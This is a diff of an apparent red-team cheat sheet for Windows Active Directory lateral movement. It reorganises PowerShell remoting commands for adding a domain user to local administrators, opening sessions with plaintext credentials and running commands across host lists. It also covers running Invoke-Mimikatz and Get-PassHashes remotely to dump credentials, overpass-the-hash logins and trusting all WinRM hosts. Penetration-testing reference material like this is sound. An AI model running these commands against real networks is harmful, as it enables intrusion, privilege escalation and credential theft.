@@ -20,41 +20,6 @@
   * [NTLM Relaying](#NTLM-Relaying)
 
 ## General
-#### Add domain user to localadmin
-```
-net localgroup Administrators <DOMAIN>\<USER> /add
-```
-
-#### Connect to machine with administrator privs
-```
-Enter-PSSession -Computername <COMPUTERNAME>
-$sess = New-PSSession -Computername <COMPUTERNAME>
-Enter-PSSession $sess
-```
-
-#### PSremoting NTLM authetication (after overpass the hash)
-```
-Enter-PSSession -ComputerName <COMPUTERNAME> -Authentication NegotiateWithImplicitCredential
-```
-
-#### Execute commands on a machine
-```
-Invoke-Command -Computername <COMPUTERNAME> -Scriptblock {<COMMAND>} 
-Invoke-Command -Scriptblock {<COMMAND>} $sess
-```
-
-#### Load script on a machine
-```
-Invoke-Command -Computername <COMPUTERNAME> -FilePath <PATH>
-Invoke-Command -FilePath <PATH> $sess
-```
-
-#### Execute locally loaded function on a list of remote machines
-```
-Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content computers.txt)
-Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content computers.txt)
-```
-
 ### Run as context of other user
 #### Runas other user
 ```
@@ -197,24 +162,42 @@ Find-PSRemotingLocalAdminAccess
 
 ### PSSession
 - Uses winrm / wmi
-#### Save pssession in variable
+- Work with the `-Credential $creds` parameter.
+
+#### Create credential object
 ```
-$sess = New-PSSession -Credential $creds -ComputerName <IP>
+$creds = get-credential
+
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('<USERNAME>', $password)
 ```
 
-#### Run commands on machine
+#### Connect to machine
 ```
-Invoke-Commannd -ScriptBlock {<COMMAND>} -Session $sess
+Enter-PSSession -Computername <COMPUTERNAME>
+```
+
+#### Connect to machine and save in session variable
+```
+$sess = New-PSSession -Computername <COMPUTERNAME>
+Enter-PSSession $sess
+```
+
+#### Execute commands on a machine
+```
+Invoke-Command -Computername <COMPUTERNAME> -Scriptblock {<COMMAND>} 
+Invoke-Command -Scriptblock {<COMMAND>} $sess
+```
+
+#### Load script on a machine
+```
+Invoke-Command -Computername <COMPUTERNAME> -FilePath <PATH>
+Invoke-Command -FilePath <PATH> $sess
 ```
 
 #### Run commands on multiple machines
 ```
 Invoke-Command –Scriptblock {<COMMAND>} -ComputerName (Get-Content computers.txt)
-```
-
-#### Load script on machine
-```
-Invoke-Commannd -Filepath <PATH TO SCRIPT> -Session $sess
 ```
 
 #### Execute script on multiple machines
@@ -227,9 +210,34 @@ Invoke-Command –FilePath script.ps1 -ComputerName (Get-Content computers.txt)
 Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content computers.txt)
 ```
 
-#### Copy item through PSSession
+#### Copy item to PSSession
 ```
 Copy-Item -ToSession $sess -Path <PATH> -Destination <DEST> -verbose
+```
+
+#### Copy item from PSSession
+```
+Copy-Item -FromSession $sess -Path <PATH> -Destination <DEST> -verbose
+```
+
+#### PSremoting NTLM authetication (after overpass the hash)
+```
+Enter-PSSession -ComputerName <COMPUTERNAME> -Authentication NegotiateWithImplicitCredential
+```
+
+#### Get trusted hosts
+```
+Get-Item WSMan:\localhost\Client\TrustedHosts
+```
+
+#### Add trusted host
+```
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value '<MACHINE OR IP>' -Concatenate
+```
+
+#### Trust all hosts
+```
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*'
 ```
 
 ### PSexec
